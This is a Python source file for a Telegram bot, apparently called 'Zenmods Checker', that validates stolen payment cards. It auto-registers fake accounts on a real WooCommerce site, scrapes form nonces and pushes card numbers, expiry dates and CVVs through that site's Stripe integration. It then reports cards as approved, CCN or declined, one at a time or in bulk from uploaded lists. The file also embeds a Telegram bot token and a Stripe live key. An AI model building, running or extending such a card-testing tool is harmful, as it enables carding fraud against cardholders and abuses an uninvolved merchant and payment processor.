from datetime import datetime, timedelta
import os
import random
import re
import string
import threading
import time
from bs4 import BeautifulSoup
from flask import Flask, request
import requests

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
SECRET_CODE = "Zenmods123"
authorized_users = set()


def create_session():
    try:
        session = requests.Session()
        common_domains = ["gmail.com"]
        username_characters = string.ascii_letters + string.digits
        email = (
            "".join(random.choice(username_characters) for _ in range(9))
            + "@"
            + random.choice(common_domains)
        )

        headers = {
            "authority": "www.thetravelinstitute.com",
            "accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
            ),
            "accept-language": "en-US,en;q=0.9",
            "user-agent": (
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            ),
        }
        response = session.get(
            "https://www.thetravelinstitute.com/register/",
            headers=headers,
            timeout=20,
        )
        soup = BeautifulSoup(response.text, "html.parser")
        nonce = soup.find("input", {"id": "afurd_field_nonce"})["value"]
        noncee = soup.find("input", {"id": "woocommerce-register-nonce"})["value"]

        data = [
            ("afurd_field_nonce", f"{nonce}"),
            ("_wp_http_referer", "/register/"),
            ("pre_page", ""),
            ("email", f"{email}"),
            ("password", "rokyNoa5954J"),
            ("woocommerce-register-nonce", f"{noncee}"),
            ("register", "Register"),
        ]
        response = session.post(
            "https://www.thetravelinstitute.com/register/",
            headers=headers,
            data=data,
            timeout=20,
        )
        if response.status_code == 200:
            return session
        return None
    except Exception as e:
        return None


def check_single_cc(cc_line, session):
    try:
        card = cc_line.replace("/", "|")
        lista = card.split("|")
        if len(lista) < 4:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: Invalid format"
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        if "20" in yy:
            yy = yy.split("20")[1]
        cvv = lista[3]

        headers = {
            "authority": "www.thetravelinstitute.com",
            "accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
            ),
            "accept-language": "en-US,en;q=0.9",
            "user-agent": (
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            ),
        }
        response = session.get(
            "https://www.thetravelinstitute.com/my-account/add-payment-method/",
            headers=headers,
            timeout=20,
        )
        html = response.text
        nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(
            1
        )

        headers_stripe = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": (
                "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
            ),
        }
        data_stripe = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX"

        response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers_stripe,
            data=data_stripe,
            timeout=20,
        )
        res = response.text

        if "error" in res:
            error = response.json()["error"]["message"]
            if "code" in error:
                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
        else:
            iddd = response.json()["id"]
            headers_confirm = {
                "authority": "www.thetravelinstitute.com",
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.thetravelinstitute.com",
                "referer": (
                    "https://www.thetravelinstitute.com/my-account/add-payment-method/"
                ),
                "user-agent": (
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like"
                    " Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
                ),
                "x-requested-with": "XMLHttpRequest",
            }
            params = {"wc-ajax": "wc_stripe_create_and_confirm_setup_intent"}
            data_confirm = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": iddd,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce,
            }
            response = session.post(
                "https://www.thetravelinstitute.com/",
                params=params,
                headers=headers_confirm,
                data=data_confirm,
                timeout=20,
            )
            res_json = response.json()
            if res_json.get("success") == False:
                error = res_json["data"]["error"]["message"]
                if "code" in error:
                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nError: {error}"
                else:
                    return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nError: {error}"
            else:
                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Approved!"
    except Exception as e:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nError: {str(e)}"


def process_bulk_file(chat_id, file_content):
    lines = [
        line.strip()
        for line in file_content.decode("utf-8").splitlines()
        if line.strip()
    ]
    total_cards = len(lines)

    if total_cards == 0:
        send_message(chat_id, "⚠️ ফাইলটি খালি রয়েছে বা কোনো কার্ড পাওয়া যায়নি!")
        return

    # Initial status message with loading timer placeholder
    msg_id = send_message_get_id(
        chat_id,
        f"⚡ **Zenmods Bulk Engine** ⚡\nTotal cards found: `{total_cards}`.\n🔄 Initializing sequential check..."
    )

    session = create_session()
    if not session:
        send_message(chat_id, "Failed to create session for bulk check.")
        return

    approved_count = 0
    ccn_count = 0
    declined_count = 0
    error_count = 0
    
    avg_time_per_card = 4  # estimated seconds per card
    start_time = time.time()

    for idx, card_line in enumerate(lines, 1):
        # Calculate remaining time dynamically
        elapsed = time.time() - start_time
        avg_time = elapsed / idx if idx > 1 else avg_time_per_card
        remaining_cards = total_cards - idx + 1
        est_remaining_sec = int(avg_time * remaining_cards)
        
        # Update progress and timer status
        progress_text = (
            f"⚡ **Zenmods Bulk Engine** ⚡\n"
            f"Progress: `[{idx}/{total_cards}]` ({int((idx/total_cards)*100)}%)\n"
            f"⏳ Estimated Time Remaining: `{est_remaining_sec}s`\n"
            f"Processing current card strictly one by one..."
        )
        if msg_id:
            edit_message(chat_id, msg_id, progress_text)

        # Strictly check one by one and wait for final status report
        result = check_single_cc(card_line, session)

        if "Approved ✅" in result:
            approved_count += 1
            # Stylish animated text & high-quality look for Zenmods approved card
            zenmods_animation = (
                "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
                "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
                f"{result}\n\n"
                "🎇🎆🎇🎆🎇🎆🎇🎆"
            )
            send_message(chat_id, zenmods_animation)
        elif "CCN ✅" in result:
            ccn_count += 1
            send_message(chat_id, result)
        elif "Declined ❌" in result:
            declined_count += 1
        else:
            error_count += 1

        time.sleep(1)  # Rate limit control between sequential checks

    # Final Report
    report = (
        f"📊 **ZENMODS BULK CHECK REPORT** 📊\n\n"
        f"Total Checked: `{total_cards}`\n"
        f"Approved ✅: `{approved_count}`\n"
        f"CCN ✅: `{ccn_count}`\n"
        f"Declined ❌: `{declined_count}`\n"
        f"Errors/Invalid: `{error_count}`\n\n"
        f"🏁 Bulk checking completed successfully!"
    )
    send_message(chat_id, report)


@app.route("/", methods=["GET"])
def home():
    return "Zenmods Checker Bot is running successfully!"


@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "").strip()

        if chat_id not in authorized_users:
            if text == SECRET_CODE:
                authorized_users.add(chat_id)
                send_message(
                    chat_id,
                    "⚡ **Zenmods Checker** ⚡\nAccess Granted! ✅\nএখন তুমি বট ব্যবহার"
                    " করতে পারবে।\nকার্ড চেক করতে `/check card|mm|yy|cvv` অথবা যেকোনো"
                    " `.txt` ফাইল পাঠাও!",
                )
            else:
                send_message(
                    chat_id,
                    "🔒 **Zenmods Checker** 🔒\nAccess Denied! ❌\nএই বট ব্যবহার করতে"
                    " হলে প্রথমে সঠিক সিক্রেট কোডটি দিন:",
                )
            return "OK", 200

        # Handle document / file upload (.txt)
        if "document" in update["message"]:
            doc = update["message"]["document"]
            file_name = doc.get("file_name", "")
            if file_name.endswith(".txt"):
                file_id = doc["file_id"]
                file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
                file_info_resp = requests.get(file_info_url).json()

                if file_info_resp.get("ok"):
                    file_path = file_info_resp["result"]["file_path"]
                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
                    file_content = requests.get(download_url).content

                    # Run bulk check sequentially in background thread
                    threading.Thread(
                        target=process_bulk_file, args=(chat_id, file_content)
                    ).start()
                else:
                    send_message(chat_id, "Failed to download the file.")
            else:
                send_message(chat_id, "⚠️ শুধুমাত্র `.txt` ফরম্যাটের ফাইল আপলোড করো!")
            return "OK", 200

        if text.startswith("/check"):
            parts = text.split(" ", 1)
            if len(parts) > 1:
                cc_line = parts[1].strip()
                send_message(chat_id, "⌛ Checking your card sequentially via Zenmods Engine...")
                session = create_session()
                if session:
                    result = check_single_cc(cc_line, session)
                    if "Approved ✅" in result:
                        zenmods_animation = (
                            "🌟✨💫 **Z E N M O D S   H I T !** 💫✨🌟\n"
                            "🔥 *The anvil rings true, a legendary strike!* 🔥\n\n"
                            f"{result}\n\n"
                            "🎇🎆🎇🎆🎇🎆🎇🎆"
                        )
                        send_message(chat_id, zenmods_animation)
                    else:
                        send_message(chat_id, result)
                else:
                    send_message(chat_id, "Failed to create session.")
            else:
                send_message(
                    chat_id,
                    "⚠️ সঠিক ফরম্যাট ব্যবহার করো:\n`/check 4532XXXXXXXXXXXX|08|28|123`",
                )
        elif text == "/start":
            send_message(
                chat_id,
                "⚡ **Zenmods Checker Bot** ⚡\nYou are already authorized! ✅\nSend"
                " single card via `/check` or upload your `.txt` card list file.",
            )

    return "OK", 200


def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    response = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    try:
        return response.json().get("result", {}).get("message_id")
    except:
        return None


def send_message_get_id(chat_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    response = requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    try:
        return response.json().get("result", {}).get("message_id")
    except:
        return None


def edit_message(chat_id, message_id, text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    try:
        requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"})
    except:
        pass


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
